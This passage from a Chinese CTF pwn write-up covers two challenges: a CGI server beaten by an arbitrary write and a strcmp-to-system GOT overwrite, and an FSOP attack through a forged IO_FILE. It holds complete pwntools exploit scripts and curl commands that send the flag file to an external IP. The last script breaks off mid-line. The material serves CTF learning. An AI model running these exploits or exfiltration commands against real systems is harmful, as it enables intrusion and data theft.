<span class="keyword">if</span> ( *(__int64 *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] &lt;= <span class="number">4</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">sprintf</span>(</span><br><span class="line">              buf,</span><br><span class="line">              <span class="string">&quot;Let us look. Oh! That is %p -&gt; \&quot;%s\&quot;.\n&quot;</span>,</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]],</span><br><span class="line">              (&amp;off_6140)[*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>]]);</span><br><span class="line">            v9 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">            send(acceptfd, buf, v9, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">#任意地址写</span><br><span class="line"><span class="keyword">if</span> ( type == <span class="number">241</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a5 &gt; <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">        *(_QWORD *)(*(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">2</span>] + *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">4</span>]) = *(_QWORD *)&amp;s[<span class="number">7</span> * i + <span class="number">6</span>];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">        <span class="built_in">sprintf</span>(buf, <span class="string">&quot;All right.I know what you say.\n&quot;</span>);</span><br><span class="line">        v11 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">        send(acceptfd, buf, v11, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是报文的目录的参数格式，在传参的时候需要base64编码（别问我怎么知道的），但是不能直接传编码后的字符串，得把后面的等号去掉才行（对比别人的wp发现的）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">s</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="keyword">uint32_t</span> type;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr1;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr2;</span><br><span class="line">    <span class="keyword">uint64_t</span> write_for_addr;</span><br><span class="line">&#125;</span><br><span class="line">type==<span class="number">0xf1</span>&amp;&amp;a5&lt;=<span class="number">2</span>:</span><br><span class="line">    *(addr1+addr2)=write_for_addr;</span><br><span class="line">type==<span class="number">0x88</span>&amp;&amp;a5&lt;=<span class="number">1</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,*(addr1+addr2))</span><br><span class="line">type==<span class="number">0x66</span>&amp;&amp;a5==<span class="number">0</span>&amp;&amp;addr1&lt;=<span class="number">4</span>:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p-&gt;%s&quot;</span>,(&amp;off_6140[addr1]),(&amp;off_6140[addr1]))</span><br><span class="line">type==<span class="number">0x12</span>&amp;&amp;addr1==<span class="string">&#x27;ping&#x27;</span>&amp;<span class="built_in">strlen</span>(&amp;addr2)&lt;=<span class="number">0xf</span></span><br><span class="line">        show</span><br></pre></td></tr></table></figure>

<p>然后利用上面代码的漏洞对got表发起攻击把strcmp改成system,但是注意不能system(“/bin/sh”),首先是shell的输入输出没有和socket绑定，其次当我们再次发送报文的时候会fork一个新进程来处理我们的报文，而不是发送给shell，所以需要反弹shell或者反弹flag,有很多反弹shell的命令但都没用，有两个反弹flag的命令能用。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system(&#x27;curl 47.107.28.194/`cat flag`&#x27;)</span><br><span class="line">system(&#x27;curl -X POST -F \&quot;flag=@/flag\&quot; 47.107.28.194:8080&#x27;)</span><br></pre></td></tr></table></figure>

<p>最后的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># ip=&#x27;127.0.0.1&#x27;</span></span><br><span class="line"><span class="comment"># port=4000</span></span><br><span class="line">ip=<span class="string">&#x27;node4.buuoj.cn&#x27;</span></span><br><span class="line">port=<span class="number">27718</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload1=p32(<span class="number">1</span>)+p32(<span class="number">0x66</span>)+p64(<span class="number">4</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload1=base64.b64encode(payload1)</span><br><span class="line">payload1=payload1.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload1)</span><br><span class="line"><span class="built_in">print</span> url1</span><br><span class="line">sh.send(url1)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Let us look. Oh! That is &#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">0x4070</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload2=p32(<span class="number">1</span>)+p32(<span class="number">0x88</span>)+p64(elf_base)+p64(<span class="number">0x6070</span>)+p64(<span class="number">0</span>)</span><br><span class="line">payload2=base64.b64encode(payload2)     </span><br><span class="line">payload2=payload2.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url2=url1=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload2)</span><br><span class="line">sh.send(url2)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;OK! I give you some message!\nMessage: &#x27;</span>)</span><br><span class="line">printf_addr=<span class="built_in">int</span>(sh.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=printf_addr-libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(printf_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">strcmp_got=elf_base+elf.got[<span class="string">&#x27;strcmp&#x27;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh.close()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh=remote(ip,port)</span><br><span class="line">payload3=p32(<span class="number">2</span>)+p32(<span class="number">241</span>)+p64(strcmp_got)</span><br><span class="line">payload3+=p64(<span class="number">0</span>)+p64(system_addr)</span><br><span class="line">payload3+=p32(<span class="number">0x22</span>)+<span class="string">&quot;curl 47.107.28.194/`cat flag`&quot;</span></span><br><span class="line">payload3=base64.b64encode(payload3)     </span><br><span class="line">payload3=payload3.replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">url3=<span class="string">&#x27;GET /submit.cgi?&#123;0&#125; HTTP/1.0\r\n\r\n&#x27;</span>.<span class="built_in">format</span>(payload3)</span><br><span class="line">sh.send(url3)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;All right.I know what you say&#x27;</span>)</span><br><span class="line">sh.close()</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>对pwn理解的更深了，说白了就是对指定的ip和端口发起socket连接，然后把sh.send的内容发送给这个端口的应用。</p>
<p>最近做题感觉漏洞利用简单，代码审计困难的题目越来越多。</p>
<h2 id="FShuiMaster"><a href="#FShuiMaster" class="headerlink" title="FShuiMaster"></a>FShuiMaster</h2><p>存在off by null漏洞，但只能申请largebin的堆块，所以可以进行larginbinattack，然后largebin上申请到的堆块可以泄露libc地址，在堆上布置然后打io_list_all就行了，重点讲一下io_list_all，我的主要学习来源是ctfwiki，对io_list_all的攻击也叫作FSOP.</p>
<p>在讲解FSOP前先讲一讲io_file结构，之前在stdout泄露libc基地址的时候讲过，但不是很深入，这里再梳理一次</p>
<p>io_file是一组织io操作的文件结构体，当打开有io操作的设备时就会生成对应的io_file结构体,比如stdout,stdin,stderr，io_file代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>file主要是对设备io操作的一些信息，vtable是一个虚表，里面记录了很多的函数地址，在io操作的时候会拿vtable里的地址跳转执行，据ctfwiki所说，在libc2.23的情况的下可以直接修改io_file_plus的vtable地址，可以伪造一个vtable然后修改io_file_plus的vtable地址指向我们的伪造的vtable(任意地址写)，然后对vtable的使用情况填上ogg或者system_addr,这种方法只适合在Libc2.23使用（在libc2.23下vtable表是不可以写入的，所以不能修改vtable里的内容）。</p>
<p>注意io_file file并不是一个指针而是给他实际分配了空间io_file_plus的完全体实际上是这样的,其中vtable相对于io_file_plus的偏移是0xd8。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> <span class="title">file</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>程序打开了很多设备代表着有很多的io_file_plus结构体，这些结构体以链表进行组织，其中next域是file的_chain，这个链表是单链表，链表头记录在io_list_all中，其中一般的链表头的io_file_plus是stderr</p>
<p>上面说了libc2.24以后不能伪造vtable了，主要是因为当使用vtable的时候就会对vtable进行范围检查，vtable得在这个范围内，虽说限制了vtable，但也存在漏洞，这个范围内也有很多我们可以利用的虚表，比如io_str_jumps或io_wfile_jumps他们里面也全部记录着函数指针，我们可以把vtable指向这两个地方比如io_str_jumps</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(overflow, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_default_read),</span><br><span class="line">  JUMP_INIT(write, _IO_default_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中_IO_str_overflow和IO_str_finish是我们主要利用的函数指针，_IO_str_overflow和IO_str_finish都存在相对地址调用，如_IO_str_overflow</p>
<h4 id="IO-str-overflow"><a href="#IO-str-overflow" class="headerlink" title="_IO_str_overflow"></a>_IO_str_overflow</h4><p><code>new_buf= (char *) (*((_IO_strfile *) fp)-&gt;_s._allocate_buffer) (new_size);</code>最后会调用fp+0xe0,然后参数是new_size,这个也是通过fp的内容计算出来的,下面是poc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">_flags = <span class="number">0</span></span><br><span class="line">_IO_write_base = <span class="number">0</span></span><br><span class="line">_IO_write_ptr = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> +<span class="number">1</span></span><br><span class="line">_IO_buf_end = (binsh_in_libc_addr <span class="number">-100</span>) / <span class="number">2</span> </span><br><span class="line"></span><br><span class="line">_freeres_list = <span class="number">0x2</span></span><br><span class="line">_freeres_buf = <span class="number">0x3</span></span><br><span class="line">_mode = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">vtable = _IO_str_jumps</span><br><span class="line">fp+<span class="number">0xe0</span>=system</span><br></pre></td></tr></table></figure>

<p>题目构造</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pay+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>+<span class="number">1</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64((libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()-<span class="number">100</span>)/<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">12</span></span><br><span class="line">pay+= p64(<span class="number">2</span>)</span><br><span class="line">pay+= p64(<span class="number">3</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)</span><br><span class="line">pay+= p64(<span class="number">0xffffffff</span>)</span><br><span class="line">pay+= p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">pay+= p64(libc.address+<span class="number">0x3e8360</span>)</span><br><span class="line">pay+= p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br></pre></td></tr></table></figure>

<p>只要fp这样构造然后调用_IO_str_overflow的时候最后就会执行system(‘/bin/sh’),现在问题是如何伪造io_file_plus以及如何执行_IO_str_overflow</p>
<p>上面提到过的，io_file_plus的头结点储存在io_list_all里面，所以可以覆盖io_list_all为我们可以控制的一段内存，比如堆，也就是说我们伪造了stferr的io_file_plus，然后在这段内存中构造上面的内容就好了。</p>
<p>函数IO_flush_all_lockp 会刷新所有文件流，内部会调用vtable+0x10的函数，当把vtable覆盖成io_str_jumps后vtable+0x10就是_IO_str_overflow函数地址，所以只要调用io_flush_all_lockp就好了，在程序main函数返回或者执行exit(0)或者执行abort时会调用io_flush_all_lockp函数，所以在fake_io_file_plus后触发io_flush_all_lockp就好了。</p>
<p>这是_IO_str_overflow的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#sh= process([&quot;./ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/ld-2.27.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&#x27;Please Write U Name on the Book\n\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">&#x27;root&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Number of words?&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input U character&#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please input the page U want 2 change&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Now Change U this page : &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input the page U want 2 tear off&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;tear_off Finished\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;Five: Finished!\n\n&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;please Input The page U want 2 scan&#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">0x440</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span 